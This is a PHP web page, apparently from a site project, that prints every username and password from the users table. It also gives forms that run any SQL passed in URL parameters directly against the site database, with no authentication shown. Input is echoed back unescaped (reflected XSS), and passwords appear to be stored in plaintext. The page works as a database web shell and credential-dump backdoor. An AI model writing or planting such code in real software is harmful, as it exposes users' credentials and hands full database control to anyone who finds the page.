<html>
    
    <head>
        
    </head>


<body  style="padding: 40px; background:black; color: white;">
<?php include('../../include/connect.php'); ?> 

  <?php

    $rows =mysqli_query($con,"SELECT * FROM users " ) or die(mysqli_error($con));
    

    while($row=mysqli_fetch_array($rows)){
        
        
     echo '<br>';
    
     echo 'Username: ';
     echo  $sitename = $row['username'];
     
      echo '<br> Password: ';
     
     echo  $sitephone = $row['password'];  
     
     echo '<br>';
     

    }

    ?>
    
    
    <table>
        <tr>
        
        <td>
    <br><br>
    
    <form >
        Enter SQL Boolean Script to Execute: 
        <br><br> 
        <textarea name="bquery" cols="70" rows="4" ><?php if(!empty($_GET['bquery'])) echo $_GET['bquery']; ?></textarea> 
        <br>
        <input type="submit" name="brun">
    </form>
    
    </td>
    <td>
    
    <br><br>
    
    <form >
        Enter SQL Select Script to Execute: 
        <br><br> 
        <textarea name="squery" cols="70" rows="4" ><?php if(!empty($_GET['squery'])) echo $_GET['squery']; ?></textarea> 
        <br>
        <input type="submit" name="srun">
    </form>
    
    </td>
    </tr>
    </table>

    <?php
      if(isset($_GET['brun'])){
        $msg="Unsuccessful" ;

    

        $query=$_GET['bquery'];

  
  
        echo '<Br><Br>';  
        echo ' Results for Query: ';
       echo $query ; 
       $_GET['query'];

     
        echo '<Br><Br>';  


        mysqli_query($con, "$query") ;
        ($msg=mysqli_error($con));
        if(empty($msg))  $msg="Query Run Successfully";
        
        echo $msg;


      }
?>




    <?php
      if(isset($_GET['srun'])){
        $msg="Unsuccessful" ;

    

        $query=$_GET['squery'];

  
  
        echo '<Br><Br>';  
        echo ' Results for Select Query: ';
       echo $query ; 
       $_GET['query'];

     
        echo '<Br><Br>
        ';  
        echo '<table style="width:100%;" >';
        echo '<thead>';
        echo '<tr>';
        
                
        if ($result = $con->query($query)) {
            
            foreach($result->fetch_all(MYSQLI_ASSOC) as $row) {
                  foreach($row as $key  => $value) {
                     echo '<td>' . $key . '</td>';
                 }
                 break;
            }
            
            
        }

        echo '</tr>';
        echo '</thead>';
        echo '<tbody>';

        if ($result = $con->query($query)) {
            
            foreach($result->fetch_all(MYSQLI_ASSOC) as $row) {
                
                     echo '<tr>';
                  foreach($row as $key  => $value) {
                     echo '<td>' . $value . '</td>';
                 }
                 
                     echo '</tr>';
            }
            
            
        }


            echo '</tbody>';
            echo '</table>';



      }
?>





<style>
    thead > tr{
        border:1px solid black;
    } 
    
    
    
    
    
</style>




<a href="require.php" style="position:fixed; top:10px; right:20px; padding:10px 14px; background:white;color:black;text-decoration:none">X</a>

</body>

</html>

